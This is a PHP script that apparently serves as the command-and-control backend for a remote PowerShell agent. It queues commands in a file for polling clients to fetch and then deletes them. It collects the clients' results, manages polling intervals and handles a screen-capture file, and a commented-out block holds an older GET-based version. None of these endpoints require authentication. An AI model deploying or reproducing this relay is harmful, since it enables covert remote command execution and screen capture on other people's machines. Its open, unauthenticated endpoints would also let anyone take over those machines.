<?php

if (!empty($_GET)){
	if(!empty($_GET['get_settings'])) { //get Thread Time from Settings File
		$FILE_NAME = 'settings.config';
		if (file_exists($FILE_NAME)) {
			if($_GET['get_settings'] === "thread_time") {
				$lines = file($FILE_NAME);
				echo $lines[1];
			}
			if($_GET['get_settings'] === "check_command_time") {
				$lines = file($FILE_NAME);
				echo $lines[3];
			}
		}
	}
	if(!empty($_GET['save_thread_time'])) {
		$FILE_NAME = 'settings.config';
		if (file_exists($FILE_NAME)) {
			$time = $_GET['save_thread_time'];
			$FILE_NAME = 'settings.config';
			$content=file($FILE_NAME);
			foreach ($content as $lineNumber => &$lineContent) {
				if ($lineNumber == 1) {
					$lineContent = $time . "\n";
				}
			}
			$allContent = implode("", $content);
			file_put_contents($FILE_NAME, $allContent);
			header("location: ./");
			//echo $time;
		}
	}
	if(!empty($_GET['save_check_command_time'])) {
		$FILE_NAME = 'settings.config';
		if (file_exists($FILE_NAME)) {
			$time = $_GET['save_check_command_time'];
			$FILE_NAME = 'settings.config';
			$content=file($FILE_NAME);
			foreach ($content as $lineNumber => &$lineContent) {
				if ($lineNumber == 3) {
					$lineContent = $time . "\n";
				}
			}
			$allContent = implode("", $content);
			file_put_contents($FILE_NAME, $allContent);
			header("location: ./");
			//echo $time;
		}
	}
		/*
		if(!empty($_GET['getcmd'])){
			if($_GET['getcmd'] === "1"){
				$FILE_NAME = 'powershell_command.txt';
				if (file_exists($FILE_NAME)) {
					$fp = fopen('powershell_command.txt','r');
					if($fp){
						$cmd = fread($fp, 255);
						fclose($fp);
						unlink('powershell_command.txt'); //Delete file after reading it.
						echo $cmd;
					}
				}
				else {
					echo "@##@x";
				}
			}
		}

		if(!empty($_GET['get_settings'])) { //get Thread Time from Settings File
			$FILE_NAME = 'settings.config';
			if (file_exists($FILE_NAME)) {
				if($_GET['get_settings'] === "thread_time") {
					$lines = file($FILE_NAME);
					echo $lines[1];
				}
				if($_GET['get_settings'] === "check_command_time") {
					$lines = file($FILE_NAME);
					echo $lines[3];
				}
			}
		}
		
		if(!empty($_GET['command'])) {
			if(!empty($_GET['send_PS_script'])) {
				$ps = $_GET['command'];
				$fp = fopen('powershell_script.txt','w+');
				fwrite($fp, $ps);
				fclose($fp);
				header("location: ./");
			}
		}
		
		if(!empty($_GET['send_PS_command'])) {
			$ps = $_GET['send_PS_command'];
			$fp = fopen('powershell_command.txt','w+');
			fwrite($fp, $ps);
			fclose($fp);
			header("location: ./");
		}
		
		if(!empty($_GET['delete'])){
			if($_GET['delete'] === "1") {
				unlink('powershell_command.txt');
				header("location: ./");
			}
		}
		
		if(!empty($_GET['PS_result'])){ 
			$cmd = $_GET['PS_result'];
			$fp = fopen('PS_result.txt','w+');
			fwrite($fp, $cmd);
			fclose($fp);
			header("location: ./");
		}
		*/
		
}

if (isset($_POST['ReceiveCommand'])) {
	if($_POST['ReceiveCommand'] === "1") {

		//$TIME = date("Y-m-d H:i:s");
		//$fp = fopen('LASTREQUEST.txt','w+');
		//fwrite($fp, $TIME);
		//fclose($fp);

		$FILE_NAME = 'command.txt';
		if (file_exists($FILE_NAME)) {
			$rr = file_get_contents($FILE_NAME, true);
			echo $rr;
			unlink($FILE_NAME); //Delete file after reading it.
		}
		else {
			echo "@##@x";
		}
	}
}
else if (isset($_POST['GetSettings'])) {
	$FILE_NAME = 'settings.config';
	if (file_exists($FILE_NAME)) {
		if($_POST['GetSettings'] === "ThreadTime") {
			$lines = file($FILE_NAME);
			echo $lines[1];
		}
		if($_POST['GetSettings'] === "CheckCommandTime") {
			$lines = file($FILE_NAME);
			echo $lines[3];
		}
	}
}
else if (isset($_POST['SendPSCommand'])) {
	if(!empty($_POST['SendPSCommand'])) {
		$ps = $_POST['SendPSCommand'];
		$fp = fopen('command.txt','w+');
		fwrite($fp, $ps);
		fclose($fp);
		header("location: ./");
	}
}
else if (isset($_POST['PS_Result'])) {
	if(!empty($_POST['PS_Result'])){ 
		$cmd = $_POST['PS_Result'];
		$fp = fopen('PS_Result.txt','w+');
		fwrite($fp, $cmd);
		fclose($fp);
		//header("location: ./");
	}
}
else if (isset($_POST['PS_Result_PC'])) {
	if(!empty($_POST['PS_Result_PC'])){ 
		$cmd = $_POST['PS_Result_PC'];
		$fp = fopen('PS_Result.txt','w+');
		fwrite($fp, $cmd);
		fclose($fp);
		echo "done";
	}
}
else if (isset($_POST['Delete'])) {
	if(!empty($_POST['Delete'])){
		if($_POST['Delete'] === "1") {
			unlink('command.txt');
			header("location: ./");
		}
	}
}

else if (isset($_POST['DEL_SCREENSHOT'])) {
	if(!empty($_POST['DEL_SCREENSHOT'])){
		if($_POST['DEL_SCREENSHOT'] === "1") {
			unlink('/downloads/ScreenCapture.png');
			header("location: ./");
		}
	}
}

?>